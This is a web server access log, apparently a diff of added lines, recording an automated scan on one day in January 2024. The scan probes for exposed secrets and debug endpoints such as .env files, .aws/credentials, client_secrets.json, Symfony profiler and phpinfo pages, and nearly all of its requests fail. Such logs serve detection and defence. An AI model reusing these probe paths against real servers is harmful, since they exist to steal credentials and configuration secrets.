+2024-01-24 21:06:40 172.31.36.65 GET /enviroments/.env - 443 - 173.239.211.36 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 41
+2024-01-24 21:06:40 172.31.36.65 POST /enviroments/.env - 443 - 173.239.211.43 Mozilla/5.0+(X11;+Linux+x86_64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 15
+2024-01-24 21:06:40 172.31.36.65 GET / - 443 - 63.135.161.113 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 200 0 0 17
+2024-01-24 21:06:41 172.31.36.65 POST / - 443 - 173.239.211.54 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 405 0 1 16
+2024-01-24 21:07:19 172.31.36.65 GET /frontend_dev.php/$ - 443 - 45.130.83.241 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:07:19 172.31.36.65 GET /debug/default/view panel=config/frontend_dev.php 443 - 173.239.211.49 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 16
+2024-01-24 21:07:22 172.31.36.65 GET /frontend_dev.php/$ - 80 - 173.239.211.39 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 16
+2024-01-24 21:07:22 172.31.36.65 GET /debug/default/view panel=config/frontend_dev.php 80 - 63.135.161.115 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:07:28 172.31.36.65 GET / - 80 - 51.250.87.116 Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:109.0)+Gecko/20100101+Firefox/116.0 - 200 0 0 127
+2024-01-24 21:07:28 172.31.36.65 GET /debug/default/view panel=config 443 - 45.130.83.248 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/16.0+Safari/605.1.15 - 404 0 2 16
+2024-01-24 21:07:29 172.31.36.65 GET /debug/default/view.html - 443 - 173.239.211.42 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 57
+2024-01-24 21:07:29 172.31.36.65 GET /debug/default/view - 443 - 45.130.83.242 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:07:30 172.31.36.65 GET /frontend/web/debug/default/view - 443 - 173.239.211.47 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:07:30 172.31.36.65 GET /web/debug/default/view - 443 - 173.239.211.42 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 59
+2024-01-24 21:07:31 172.31.36.65 GET /sapi/debug/default/view - 443 - 63.135.161.115 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 63
+2024-01-24 21:07:31 172.31.36.65 GET /debug/default/view panel=config 80 - 63.135.161.121 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:07:31 172.31.36.65 GET /debug/default/view.html - 80 - 173.239.211.37 Mozilla/5.0+(Windows+NT+10.0;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:07:31 172.31.36.65 GET /debug/default/view - 80 - 45.130.83.245 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 17
+2024-01-24 21:07:32 172.31.36.65 GET /frontend/web/debug/default/view - 80 - 63.135.161.119 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:07:32 172.31.36.65 GET /web/debug/default/view - 80 - 173.239.211.52 Mozilla/5.0+(Windows+NT+10.0;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:07:32 172.31.36.65 GET /sapi/debug/default/view - 80 - 173.239.211.44 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:07:42 172.31.36.65 GET /config.json - 443 - 173.239.211.48 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 15
+2024-01-24 21:07:42 172.31.36.65 GET /AwsConfig.json - 443 - 63.135.161.114 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:07:42 172.31.36.65 GET /awsconfig.json - 443 - 45.130.83.249 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 17
+2024-01-24 21:07:43 172.31.36.65 GET /aws.json - 443 - 173.239.211.45 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 15
+2024-01-24 21:07:43 172.31.36.65 GET /conf.json - 443 - 45.130.83.246 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 47
+2024-01-24 21:07:45 172.31.36.65 GET /env.json - 443 - 173.239.211.49 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:07:45 172.31.36.65 GET /.vscode/sftp.json - 443 - 63.135.161.113 Mozilla/5.0+(X11;+Linux+x86_64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 59
+2024-01-24 21:07:45 172.31.36.65 GET /.json - 443 - 173.239.211.46 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 58
+2024-01-24 21:07:46 172.31.36.65 GET /smtp.json - 443 - 63.135.161.129 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 17
+2024-01-24 21:07:46 172.31.36.65 GET /db.json - 443 - 173.239.211.44 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:07:50 172.31.36.65 GET /config.json - 80 - 63.135.161.122 Mozilla/5.0+(X11;+Linux+x86_64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 15
+2024-01-24 21:07:50 172.31.36.65 GET /AwsConfig.json - 80 - 45.130.83.238 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:07:51 172.31.36.65 GET /awsconfig.json - 80 - 63.135.161.117 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 16
+2024-01-24 21:07:51 172.31.36.65 GET /aws.json - 80 - 173.239.211.40 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:07:51 172.31.36.65 GET /conf.json - 80 - 173.239.211.54 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:07:51 172.31.36.65 GET /env.json - 80 - 45.130.83.246 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:07:51 172.31.36.65 GET /ws-config.json - 443 - 45.130.83.245 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 15
+2024-01-24 21:07:51 172.31.36.65 GET /.vscode/sftp.json - 80 - 63.135.161.110 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/107.0.0.0+Safari/537.36 - 404 0 2 17
+2024-01-24 21:07:53 172.31.36.65 GET /_wpeprivate/config.json - 443 - 173.239.211.48 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 59
+2024-01-24 21:07:53 172.31.36.65 GET /.json - 80 - 173.239.211.41 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 17
+2024-01-24 21:07:53 172.31.36.65 GET /smtp.json - 80 - 173.239.211.51 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:07:53 172.31.36.65 GET /deployment-config.json - 443 - 173.239.211.44 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:07:53 172.31.36.65 GET /db.json - 80 - 173.239.211.41 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:07:54 172.31.36.65 GET /sendgrid.json - 80 - 191.101.41.157 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/107.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:07:54 172.31.36.65 GET /sftp-config.json - 443 - 45.130.83.239 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:07:54 172.31.36.65 GET /ws-config.json - 80 - 45.130.83.240 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:07:54 172.31.36.65 GET /_wpeprivate/config.json - 80 - 63.135.161.115 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 15
+2024-01-24 21:07:54 172.31.36.65 GET /db/robomongo.json - 443 - 173.239.211.36 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:07:54 172.31.36.65 GET /deployment-config.json - 80 - 173.239.211.39 Mozilla/5.0+(Windows+NT+10.0;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:07:54 172.31.36.65 GET /sftp-config.json - 80 - 173.239.211.55 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:07:55 172.31.36.65 GET /robomongo.json - 443 - 173.239.211.52 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:07:55 172.31.36.65 GET /db/robomongo.json - 80 - 173.239.211.47 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:07:55 172.31.36.65 GET /robomongo.json - 80 - 173.239.211.46 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 17
+2024-01-24 21:07:55 172.31.36.65 GET /client_secrets.json - 443 - 173.239.211.53 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 51
+2024-01-24 21:07:55 172.31.36.65 GET /client_secrets.json - 80 - 63.135.161.118 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:07:56 172.31.36.65 GET /user-config.json - 80 - 45.130.83.249 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:07:56 172.31.36.65 GET /user-config.json - 443 - 45.130.83.242 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 27
+2024-01-24 21:07:56 172.31.36.65 GET /ssh-config.json - 80 - 173.239.211.50 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:07:56 172.31.36.65 GET /ssh-config.json - 443 - 63.135.161.110 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 17
+2024-01-24 21:07:56 172.31.36.65 GET /database-config.json - 80 - 63.135.161.114 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/107.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:07:56 172.31.36.65 GET /config/default.json - 80 - 63.135.161.129 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:07:57 172.31.36.65 GET /database-config.json - 443 - 173.239.211.52 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 51
+2024-01-24 21:07:57 172.31.36.65 GET /config/config.json - 80 - 173.239.211.53 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:07:58 172.31.36.65 GET /credentials/config.json - 80 - 173.239.211.35 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 17
+2024-01-24 21:07:58 172.31.36.65 GET / - 80 - 173.239.211.47 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 200 0 0 15
+2024-01-24 21:08:03 172.31.36.65 GET /config/config.json - 443 - 173.239.211.49 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 31
+2024-01-24 21:08:03 172.31.36.65 GET /credentials/config.json - 443 - 173.239.211.36 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:03 172.31.36.65 GET / - 443 - 45.130.83.243 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 200 0 0 16
+2024-01-24 21:08:07 172.31.36.65 GET /.aws/credentials - 80 - 63.135.161.110 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:12 172.31.36.65 GET /.aws/credentials - 443 - 45.130.83.245 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/16.0+Safari/605.1.15 - 404 0 2 50
+2024-01-24 21:08:15 172.31.36.65 GET /app_dev.php/_profiler/open file=app/config/parameters.yml 80 - 173.239.211.39 Mozilla/5.0+(X11;+Linux+x86_64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 15
+2024-01-24 21:08:15 172.31.36.65 GET /_profiler/open file=app/config/parameters.yml 80 - 45.130.83.247 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:15 172.31.36.65 GET /app/config/parameters.yml - 80 - 173.239.211.43 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 17
+2024-01-24 21:08:16 172.31.36.65 GET /config/parameters.yml - 80 - 63.135.161.122 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.15;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:08:16 172.31.36.65 GET /parameters.yml - 80 - 173.239.211.50 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 16
+2024-01-24 21:08:26 172.31.36.65 GET /_profiler/phpinfo - 80 - 45.130.83.251 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 17
+2024-01-24 21:08:26 172.31.36.65 GET /app_dev.php/_profiler/phpinfo - 80 - 45.130.83.246 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:26 172.31.36.65 GET /phpinfo.php - 80 - 63.135.161.121 Mozilla/5.0+(Windows+NT+10.0;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 15
+2024-01-24 21:08:26 172.31.36.65 GET /info.php - 80 - 63.135.161.117 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:28 172.31.36.65 GET /owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php - 80 - 63.135.161.113 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:28 172.31.36.65 GET / phpinfo=1 80 - 173.239.211.49 Mozilla/5.0+(Windows+NT+10.0;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 200 0 0 16
+2024-01-24 21:08:28 172.31.36.65 GET /tool/view/phpinfo.view.php - 80 - 191.101.41.157 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:08:28 172.31.36.65 GET /phpinfo - 80 - 173.239.211.37 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:29 172.31.36.65 GET /html/phpinfo.php - 80 - 63.135.161.118 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:29 172.31.36.65 GET / phpinfo=-1 80 - 173.239.211.44 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 200 0 0 15
+2024-01-24 21:08:29 172.31.36.65 GET /__info.php - 80 - 45.130.83.249 Mozilla/5.0+(X11;+Linux+x86_64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 16
+2024-01-24 21:08:29 172.31.36.65 GET /_info-backoffice.php - 80 - 173.239.211.45 Mozilla/5.0+(X11;+Linux+x86_64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:08:29 172.31.36.65 GET /_info.php - 80 - 63.135.161.114 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:30 172.31.36.65 GET /_phpinf.php - 80 - 45.130.83.245 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:08:30 172.31.36.65 GET /_phpinfo.php - 80 - 45.130.83.250 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 17
+2024-01-24 21:08:30 172.31.36.65 GET /_poopinfo.php - 80 - 45.130.83.248 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:30 172.31.36.65 GET /.__info.php - 80 - 173.239.211.38 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:08:30 172.31.36.65 GET /app_dev.php/_profiler/open file=app/config/parameters.yml 443 - 45.130.83.249 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:31 172.31.36.65 GET /.info.php - 80 - 173.239.211.36 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:31 172.31.36.65 GET /_profiler/open file=app/config/parameters.yml 443 - 63.135.161.119 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:31 172.31.36.65 GET /0.0_phpinfo.php - 80 - 63.135.161.129 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:31 172.31.36.65 GET /00_server_info.php - 80 - 45.130.83.241 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:08:32 172.31.36.65 GET /app/config/parameters.yml - 443 - 63.135.161.114 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 59
+2024-01-24 21:08:32 172.31.36.65 GET /02-info.php - 80 - 63.135.161.117 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:32 172.31.36.65 GET /1_1_PhpInfo.php - 80 - 173.239.211.55 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:32 172.31.36.65 GET /5info.php - 80 - 45.130.83.251 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:32 172.31.36.65 GET /config/parameters.yml - 443 - 45.130.83.242 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:08:32 172.31.36.65 GET / - 80 - 63.135.161.119 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 200 0 0 16
+2024-01-24 21:08:33 172.31.36.65 GET /parameters.yml - 443 - 173.239.211.41 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 58
+2024-01-24 21:08:42 172.31.36.65 GET /api/index.php/v1/config/application public=true 80 - 63.135.161.110 Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:08:42 172.31.36.65 GET /_profiler/phpinfo - 443 - 191.101.41.158 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/107.0.0.0+Safari/537.36 - 404 0 2 47
+2024-01-24 21:08:42 172.31.36.65 GET /app_dev.php/_profiler/phpinfo - 443 - 63.135.161.121 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/107.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:42 172.31.36.65 GET /phpinfo.php - 443 - 63.135.161.122 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 52
+2024-01-24 21:08:44 172.31.36.65 GET /info.php - 443 - 173.239.211.52 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 59
+2024-01-24 21:08:44 172.31.36.65 GET /owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php - 443 - 63.135.161.129 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:44 172.31.36.65 GET / phpinfo=1 443 - 63.135.161.110 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 200 0 0 54
+2024-01-24 21:08:45 172.31.36.65 GET /tool/view/phpinfo.view.php - 443 - 45.130.83.246 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:08:45 172.31.36.65 GET /phpinfo - 443 - 191.101.41.158 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 44
+2024-01-24 21:08:45 172.31.36.65 GET /symfony/public/_profiler/phpinfo - 443 - 63.135.161.117 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 31
